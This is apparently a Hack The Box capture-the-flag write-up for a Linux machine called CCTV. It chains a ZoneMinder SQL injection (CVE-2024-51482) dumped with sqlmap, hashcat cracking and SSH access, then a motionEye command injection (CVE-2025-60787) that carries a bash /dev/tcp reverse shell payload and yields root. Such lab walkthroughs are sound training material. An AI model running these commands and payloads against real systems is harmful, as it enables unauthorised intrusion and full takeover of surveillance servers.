# CCTV — Hack The Box Writeup

## Overview

**Target:** CCTV  
**IP:** `10.129.8.53`  
**Difficulty:** Easy/Medium  
**OS:** Linux  

---

# Reconnaissance

## Full Port Scan

```bash
nmap -sS -p- 10.129.8.53
```

### Output

```text
22/tcp open ssh
80/tcp open http
```

---

## Service Enumeration

```bash
nmap -sC -sV -A 10.129.8.53
```

### Initial Observations

- SSH exposed externally
- HTTP exposed externally
- Web application became the primary attack surface

---

# Web Enumeration

Added target domain locally:

```bash
echo "10.129.8.53 cctv.htb" | sudo tee -a /etc/hosts
```

Visited:

```text
http://cctv.htb/zm/
```

Discovered:

- ZoneMinder login panel
- Version: `1.37.63`

---

## Default Credentials

Tried:

```text
Username: admin
Password: admin
```

Login successful.

This provided access to the ZoneMinder dashboard.

---

# Initial Foothold — SQL Injection

## Vulnerability

ZoneMinder was vulnerable to:

**CVE-2024-51482**

A time-based blind SQL injection vulnerability in the `tid` parameter.

---

## Extract Session Cookie

Grab session cookie:

```text
F12 → Application → Cookies → ZMSESSID
```

---

## Exploit with SQLMap

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm \
-T Users \
-C Username,Password \
--dump \
--batch \
--dbms=MySQL \
--technique=T \
--cookie="ZMSESSID=YOUR_SESSION_ID"
```

---

## Dumped Credentials

```text
admin
mark
superadmin
```

Retrieved multiple bcrypt password hashes.

---

# Password Cracking

Saved Mark's hash:

```bash
echo '$HASH_HERE' > hash.txt
```

Cracked with Hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Cracked Credentials

```text
mark : opensesame
```

---

# Initial Access

SSH login:

```bash
ssh mark@cctv.htb
```

Password:

```text
opensesame
```

Successfully gained shell access as `mark`.

---

# Internal Enumeration

Checked internal listening services:

```bash
ss -tlnp
```

### Discovered Internal Services

```text
8765 → motionEye
7999 → Motion Control API
9081 → MJPEG Stream
3306 → MySQL
```

Port `8765` became the next target.

---

# SSH Port Forwarding

Forward internal motionEye dashboard:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Access locally:

```text
http://127.0.0.1:8765
```

**Important:** Keep this SSH tunnel alive.

---

# motionEye Credential Discovery

Checked configuration file:

```bash
cat /etc/motioneye/motion.conf
```

Found:

```text
admin username
admin password hash
```

Used these credentials to access motionEye dashboard.

---

# Privilege Escalation

## Vulnerability

motionEye vulnerable to:

**CVE-2025-60787**

OS command injection vulnerability.

---

# JavaScript Validation Bypass

Open browser console:

```javascript
configUiValid = function() { return true; };
```

This bypasses frontend validation.

---

# Start Listener

On attacker machine:

```bash
nc -lvnp 4444
```

---

# Command Injection Payload

Injected reverse shell payload into:

- Image File Name
- Command execution field

Payload:

```bash
bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
```

---

# Trigger Execution

Trigger snapshot manually:

```bash
curl "http://127.0.0.1:7999/1/action/snapshot"
```

This forces motionEye to process the malicious configuration.

---

# Root Shell

Listener receives connection:

```text
root@cctv:/etc/motioneye#
```

Privilege escalation successful.

---

# User Flag

```bash
cat /home/mark/user.txt
```

---

# Root Flag

```bash
cat /root/root.txt
```

---

# Attack Chain Summary

```text
Nmap Scan
→ Web Enumeration
→ Default Credentials
→ SQL Injection
→ Hash Extraction
→ Password Cracking
→ SSH Access
→ Internal Service Discovery
→ Port Forwarding
→ motionEye Access
→ Command Injection
→ Root Shell
```

---

# Challenges Faced

### SSH Tunnel Mistakes

Forgetting `-L` prevents local forwarding.

---

### Wrong Port Usage

Port `8765` = dashboard  
Port `7999` = snapshot trigger

---

### Payload Timing

motionEye may take several seconds before executing payloads.

---

### Local vs Remote Confusion

Always verify where commands should run.

---

# Tools Used

- Nmap
- SQLMap
- Hashcat
- SSH
- Netcat
- Curl
- Firefox DevTools

---

# CVEs Referenced

- CVE-2024-51482 → ZoneMinder SQL Injection
- CVE-2025-60787 → motionEye Command Injection

---

# Lessons Learned

- Always enumerate internal services
- Port forwarding is critical in real engagements
- Web app vulnerabilities often chain into deeper infrastructure compromise
- Frontend validation can often be bypassed
- Small internal misconfigurations can lead to full root compromise

---

# Final Thoughts

This machine was an excellent example of chaining multiple vulnerabilities:

- SQL Injection
- Password cracking
- Internal pivoting
- Command injection
- Root privilege escalation

Very realistic workflow for modern penetration testing.
